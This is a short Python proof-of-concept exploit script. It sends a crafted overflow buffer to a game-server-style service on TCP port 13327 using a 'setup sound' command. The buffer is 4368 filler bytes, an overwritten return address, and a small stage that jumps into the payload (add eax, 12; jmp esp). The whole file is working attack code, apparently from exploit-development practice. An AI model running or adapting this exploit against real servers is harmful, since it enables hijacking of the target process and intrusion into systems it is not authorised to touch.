
#!/usr/bin/python
import socket

host="127.0.0.1"
# 0x83C00C add eax, 12
# 0xFFE0   jmp esp
# 0x90     nop
crash="\x41" * 4368 + "\x96\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

buffer="\x11(setup sound " + crash + "\x90\x00#"

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "[*] Sending evil buffer..."

s.connect((host, 13327))
s.send(buffer)
data=s.recv(1024)
print data
s.close()

print "[*] Payload sent!"


